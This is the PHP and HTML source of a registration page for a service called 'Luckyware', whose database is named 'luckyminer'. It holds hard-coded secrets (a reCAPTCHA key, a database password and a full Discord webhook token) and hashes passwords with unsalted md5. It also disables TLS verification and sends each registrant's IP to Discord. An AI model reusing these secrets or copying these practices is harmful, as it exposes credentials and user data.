<?php

$domainyess = $_SERVER['HTTP_HOST'];

function generateRandomString($length = 30)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function GetIP()
{

    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }


    return $_SERVER['REMOTE_ADDR'];
}

$IP = GetIP();

function getCountryCode($ip)
{

    $url = "http://ipinfo.io/{$ip}/json";
    $response = file_get_contents($url);
    $data = json_decode($response, true);

    return $data['country'] ?? 'Unknown';
}

if (isset($_POST['submit'])) {


    $secret = "6LeB-twjAAAAAKTSe33B55g7AOs8R6EGO1P2rBJp";
    $response = $_POST['g-recaptcha-response'];
    $remoteip = $_SERVER['REMOTE_ADDR'];
    $url = "https://www.google.com/recaptcha/api/siteverify?secret=$secret&response=$response&remoteip=$remoteip";
    $data = file_get_contents($url);
    $row = json_decode($data, true);

    $IP = GetIP();

    $ctrycode = getCountryCode($IP);



    if ($row['success'] == "true") {

        $conn = mysqli_connect("localhost", "miner", "Sifre.12345", "luckyminer");

        $name = mysqli_real_escape_string($conn, $_POST['name']);
        $email = mysqli_real_escape_string($conn, $_POST['email']);
        $pass = md5($_POST['password']);
        $cpass = md5($_POST['cpassword']);
        $user_type = $_POST['user_type'];
        $Ownerkey = generateRandomString();


        $selecta = mysqli_prepare($conn, "SELECT * FROM accounts WHERE Email = ?");
        mysqli_stmt_bind_param($selecta, "s", $email);
        mysqli_stmt_execute($selecta);
        $resulta = mysqli_stmt_get_result($selecta);

        $select = mysqli_prepare($conn, "SELECT * FROM accounts WHERE Username = ?");
        mysqli_stmt_bind_param($select, "s", $name);
        mysqli_stmt_execute($select);
        $result = mysqli_stmt_get_result($select);

        $usergay = strlen($name);
        $passgay = strlen($_POST['password']);
        $mailgay = strlen($email);
        if ($usergay < 2) {
            $error[] = 'Username too short';
        } else if ($passgay < 3) {

            $error[] = 'Pass too short';
        } else if ($mailgay < 5) {

            $error[] = 'Invalid Mail';
        } else if (mysqli_num_rows($resulta) > 0) {

            $error[] = 'Email Already Exists!';
        } else if (mysqli_num_rows($result) > 0) {

            $error[] = 'User Already Exists!';
        } else {


            $insert = "INSERT INTO accounts (Username, ip, LastCountry, Role, Pass, Email, OwnerKey) VALUES (?, ?, ?, 'Trial', ?, ?, ?)";

            if ($stmt = mysqli_prepare($conn, $insert)) {
                // Bind variables to the prepared statement as parameters
                mysqli_stmt_bind_param($stmt, "ssssss", $name, $IP, $ctrycode, $pass, $email, $Ownerkey);

                // Execute the prepared statement
                if (mysqli_stmt_execute($stmt)) {
                    // The query was successful
                    $url = "https://discord.com/api/webhooks/1406399424149586032/F1FrMw_FvKud4bh8Br6JIb3VzzuRkm_anW50HTjMQxDYQ4P6GtuqWcd5wHtj2HpqEWXt";
                    $headers = ['Content-Type: application/json; charset=utf-8'];
                    $messages = ':star: ' . $name . ' Just Registered With IP ' . $IP . ' Appended OwnerKey Is ' . $Ownerkey . ' :star:';
                    $POST = ['username' => 'Registesr Logs', 'content' => $messages];

                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $url);
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                    $response = curl_exec($ch);
                    header("location: ../Login");
                } else {
                    // An error occurred

                }

                // Close the statement
                mysqli_stmt_close($stmt);
            } else {
                // An error occurred while preparing the statement
                echo "Error: " . mysqli_error($conn);
            }

            // Close the database connection
            mysqli_close($conn);
        }
    } else {
        $error[] = 'Complete Capctha';
    }
}
;

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="stylesheet" href="assets/css/hover.css">
    <link rel="stylesheet" href="assets/css/custom.css">
    <link rel="stylesheet" href="../assets/fontaw/css/all.min.css">
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Nunito+Sans&display=swap">
    <meta content="Luckyware" property="og:title" />
    <meta content="Luck is something you make and victory is something u take" property="og:description" />
    <meta content="https://<?php echo $domainyess; ?>" property="og:url" />
    <meta content="https://<?php echo $domainyess; ?>/icon.png" property="og:image" />
    <meta content="#c20303" data-react-helmet="true" name="theme-color" />
    <link rel="shortcut icon" href="https://<?php echo $domainyess; ?>/icon.png" />
    <title>Register</title>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');

        body {
            font-family: 'Inter', sans-serif;
            background: #151515;
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background:
                radial-gradient(circle at 20% 50%, rgba(194, 3, 3, 0.03) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(194, 3, 3, 0.02) 0%, transparent 50%);
            pointer-events: none;
            z-index: -1;
        }

        .register-container {
            background: #111111;
            backdrop-filter: blur(20px);
            border: 1px solid rgba(194, 3, 3, 0.15);
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6);
            border-radius: 16px;
            animation: slideUp 0.8s ease-out;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .logo-glow {
            filter: drop-shadow(0 0 15px rgba(194, 3, 3, 0.3));
            animation: float 3s ease-in-out infinite;
        }

        @keyframes float {

            0%,
            100% {
                transform: translateY(0px);
            }

            50% {
                transform: translateY(-5px);
            }
        }

        .title-glow {
            text-shadow: 0 0 20px rgba(194, 3, 3, 0.2);
        }

        .accent-red {
            color: #c20303;
        }

        .input-field {
            background: #111111 !important;
            border: 1px solid rgba(255, 255, 255, 0.1) !important;
            transition: all 0.3s ease;
        }

        .input-field:focus {
            border-color: #c20303 !important;
            box-shadow: 0 0 0 3px rgba(194, 3, 3, 0.1) !important;
            background: #121212 !important;
        }

        .btn-modern {
            background: linear-gradient(135deg, #c20303, #8b0000);
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(194, 3, 3, 0.2);
        }

        .btn-modern:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(194, 3, 3, 0.4);
        }

        .btn-secondary {
            background: #111111;
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: all 0.3s ease;
        }

        .btn-secondary:hover {
            background: #121212;
            border-color: rgba(194, 3, 3, 0.3);
            transform: translateY(-1px);
        }

        .error-modern {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.3);
            color: #fca5a5;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 16px;
            font-size: 14px;
            animation: shake 0.5s ease-in-out;
        }

        @keyframes shake {

            0%,
            100% {
                transform: translateX(0);
            }

            25% {
                transform: translateX(-5px);
            }

            75% {
                transform: translateX(5px);
            }
        }

        .icon-accent {
            color: #c20303;
        }

        .login-link {
            color: #c20303;
            transition: all 0.3s ease;
        }

        .login-link:hover {
            text-decoration: underline;
            text-shadow: 0 0 8px rgba(194, 3, 3, 0.3);
        }

        input::placeholder {
            color: #9ca3af !important;
        }

        .recaptcha-center {
            display: flex;
            justify-content: center;
            margin: 20px 0;
        }

        @media (max-width: 640px) {
            .register-container {
                margin: 20px;
                padding: 24px;
            }

            .logo-glow {
                width: 60px;
            }
        }

        html,
        body {
            background: #151515 !important;
            color: #ffffff !important;
        }


        .text-white,
        h1 {
            color: #ffffff !important;
        }

        .text-gray-300,
        label {
            color: #d1d5db !important;
        }

        .text-gray-400,
        p {
            color: #9ca3af !important;
        }

        .text-gray-500 {
            color: #6b7280 !important;
        }

        .input-field {
            color: #ffffff !important;
        }

        ::-webkit-scrollbar {
            width: 6px;
        }

        ::-webkit-scrollbar-track {
            background: rgba(255, 255, 255, 0.05);
        }

        ::-webkit-scrollbar-thumb {
            background: #c20303;
            border-radius: 3px;
        }
    </style>
</head>

<body onload="loginStart()">

    <div class="min-h-screen flex items-center justify-center px-4 py-8">
        <div class="register-container w-full max-w-md p-8">


            <div class="text-center mb-8">
                <img class="logo-glow w-20 mx-auto mb-4" src="https://<?php echo $domainyess; ?>/icon.png"
                    alt="Luckyware Logo">
                <h1 class="text-white text-3xl font-bold tracking-wide mb-2 title-glow">
                    Luckyware <span class="accent-red">Register</span>
                </h1>
                <p class="text-gray-400 text-sm">Create your data management account</p>
            </div>


            <?php
            if (isset($error)) {
                foreach ($error as $error) {
                    echo '<div class="error-modern">' . $error . '</div>';
                }
            }
            ?>


            <form class="" action="" method="post">


                <div class="mb-6">
                    <label class="block text-gray-300 font-medium mb-2 tracking-wide">
                        <i class="fa-solid fa-user icon-accent mr-2"></i> Username
                    </label>
                    <div class="sc-container">
                        <input id="name" name="name" data-sc=""
                            class="smoothCaretInput input-field w-full py-3 px-4 rounded-lg text-gray-300"
                            placeholder="Enter Username" type="text">
                        <div class="caret w-80" style="width: 2px; height: 60%; background-color: #850000;"></div>
                    </div>
                </div>


                <div class="mb-6">
                    <label class="block text-gray-300 font-medium mb-2 tracking-wide">
                        <i class="fa-solid fa-envelope icon-accent mr-2"></i> Email
                    </label>
                    <div class="sc-container">
                        <input id="email" name="email" data-sc=""
                            class="smoothCaretInput input-field w-full py-3 px-4 rounded-lg text-gray-300"
                            placeholder="Enter Email" type="text">
                        <div class="caret w-80" style="width: 2px; height: 60%; background-color: #850000;"></div>
                    </div>
                </div>


                <div class="mb-6">
                    <label class="block text-gray-300 font-medium mb-2 tracking-wide">
                        <i class="fa-solid fa-lock icon-accent mr-2"></i> Password
                    </label>
                    <div class="sc-container">
                        <input id="password" name="password" data-sc=""
                            class="smoothCaretInput input-field w-full py-3 px-4 rounded-lg text-gray-300"
                            placeholder="Enter Password" type="password">
                        <div class="caret w-80" style="width: 2px; height: 60%; background-color: #850000;"></div>
                    </div>
                </div>


                <div id="captcha" class="recaptcha-center">
                    <div class="g-recaptcha" data-sitekey="6LeB-twjAAAAAFoigBRht3cfNnnLoOFhK1mXbAXd" data-theme="dark">
                    </div>
                </div>


                <div class="mb-4">
                    <button id="loginBtn" type="submit" name="submit"
                        class="btn-modern w-full py-3 rounded-lg text-white font-semibold hvr-underline-from-center">
                        Create Account <i class="fa-solid fa-right-to-bracket ml-2"></i>
                    </button>
                </div>

            </form>


            <button id="captchaBtn" onclick="captchaOpen()"
                class="btn-secondary w-full py-3 rounded-lg text-gray-300 font-semibold hvr-underline-from-center mb-6">
                Continue <i class="fa-solid fa-arrow-right ml-2"></i>
            </button>


            <p class="text-gray-400 text-center">
                Already Registered?
                <a class="login-link font-medium" href="../Login">Login Now</a>
            </p>


            <div class="mt-8 pt-6 border-t border-white/10 text-center">
                <p class="text-xs text-gray-500">
                    © 2025 Luckyware. Secure registration portal.
                </p>
            </div>

        </div>
    </div>

    <script src="https://dooovid.github.io/smoothcaret/demo/smoothCaret.min.js" defer></script>
    <script src="login.js"></script>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const form = document.querySelector('form');

            form.addEventListener('keypress', function (event) {
                if (event.key === 'Enter') {
                    event.preventDefault();
                    return false;
                }
            });
        });
    </script>

</body>

</html>